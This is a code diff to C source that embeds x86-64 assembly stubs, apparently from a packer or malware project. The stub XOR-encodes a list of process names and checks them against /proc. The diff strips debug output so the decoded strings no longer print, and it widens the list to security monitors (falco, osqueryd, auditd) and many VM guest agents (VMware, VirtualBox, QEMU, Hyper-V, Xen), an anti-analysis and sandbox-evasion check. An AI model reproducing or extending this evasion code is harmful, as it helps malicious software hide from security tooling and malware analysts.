@@ -190,16 +190,16 @@ static const char STUB_AV_DETECT[] =
 "comm_len_done:\n"
 
     //; Afficher comm (rdx = longueur, rsi = [rsp+4096])
-"mov rax, 1\n"
-"mov rdi, 1\n"
-"syscall\n"
+//"mov rax, 1\n"
+//"mov rdi, 1\n"
+//"syscall\n"
 
     //; Afficher '\n'
-"mov rax, 1\n"
-"mov rdi, 1\n"
-"lea rsi, [newline]\n"
-"mov rdx, 1\n"
-"syscall\n"
+//"mov rax, 1\n"
+//"mov rdi, 1\n"
+//"lea rsi, [newline]\n"
+//"mov rdx, 1\n"
+//"syscall\n"
 
     //; Comparer contre forbidden_list (XOR 42)
 "xor r8, r8\n"
@@ -300,26 +300,6 @@ static const char STUB_AV_DETECT[] =
 "je skip_xor\n"
 "xor dl, 42\n"
 "skip_xor:\n"
-//; --- DEBUG WRITE : affiche l'octet decode dans dl ---
-"push rax\n"
-"push rdi\n"
-"push rsi\n"
-"push rdx\n"
-"push rcx\n"
-"sub rsp, 8\n"
-"mov [rsp], dl\n"
-"mov rax, 1\n"
-"mov rdi, 1\n"
-"mov rsi, rsp\n"
-"mov rdx, 1\n"
-"syscall\n"
-"add rsp, 8\n"
-"pop rcx\n"
-"pop rdx\n"
-"pop rsi\n"
-"pop rdi\n"
-"pop rax\n"
-    //; --- FIN DEBUG WRITE ---
 //"break\n" //; [B9] avant strcmp : rdi = comm, rsi = entree forbidden_list
 "cmp al, dl\n"
 "jne strcmp_not_equal\n"
@@ -369,7 +349,20 @@ static const char STUB_AV_DATA[] =
     ".string 42 \"falco\"\n"
     ".string 42 \"osqueryd\"\n"
     ".string 42 \"auditd\"\n"
-    ".string 42 \"systemd\"\n"
+    ".string 42 \"vmtoolsd\"\n"
+    ".string 42 \"VGAuthService\"\n"
+    ".string 42 \"VBoxService\"\n"
+    ".string 42 \"VBoxClient\"\n"
+    ".string 42 \"qemu-ga\"\n"
+    ".string 42 \"spice-vdagent\"\n"
+    ".string 42 \"hv_vss_daemon\"\n"
+    ".string 42 \"hv_kvp_daemon\"\n"
+    ".string 42 \"hv_fcopy_daemon\"\n"
+    ".string 42 \"hypervvssd\"\n"
+    ".string 42 \"hypervkvpd\"\n"
+    ".string 42 \"hypervfcopyd\"\n"
+    ".string 42 \"xenstored\"\n"
+    ".string 42 \"xenconsoled\"\n"
     ".db 0\n"
 "proc_path:\n"
     ".string \"/proc\"\n"
@@ -380,7 +373,7 @@ static const char STUB_AV_DATA[] =
 "newline:\n"
     ".db 10\n"
 "found_msg:\n"
-    ".string \"Processus interdit détecté: \"\n";
+    ".string \"Stop: \"\n";
 
 static const char STUB_POLY_DEMO_DATA[] =
 "greeting_msg:\n"
